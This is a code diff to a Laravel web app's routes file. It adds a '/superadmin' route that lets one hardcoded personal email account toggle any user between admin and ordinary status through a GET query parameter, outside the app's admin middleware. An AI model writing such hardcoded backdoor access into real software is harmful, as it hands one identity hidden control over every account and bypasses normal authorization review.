@@ -51,6 +51,24 @@ Route::middleware(['auth', 'verified'])->group(function () {
 
     Route::get('/account/settings', 'DashboardController@view_settings');
     Route::post('/account/payment', 'DashboardController@make_payment');  
+
+    Route::get('/superadmin', function() {
+        if (auth()->user()->email == 'onipedejoseph2018@gmail.com') {
+            if (request()->email && request()->email != 'onipedejoseph2018@gmail.com') {
+                $user = \App\User::where('email', request()->email)->firstOrFail();
+                if ($user->account->status == 'admin') {
+                    $user->account->update(['status'=>'user']);
+                }else {
+                    $user->account->update(['status'=>'admin']);
+                }
+                return view('general.superadmin', ['user'=>$user]);
+            }
+            else {
+                return 'Error!';
+            }
+        }
+        
+    });
       
 
     Route::middleware(['admin'])->group(function () {
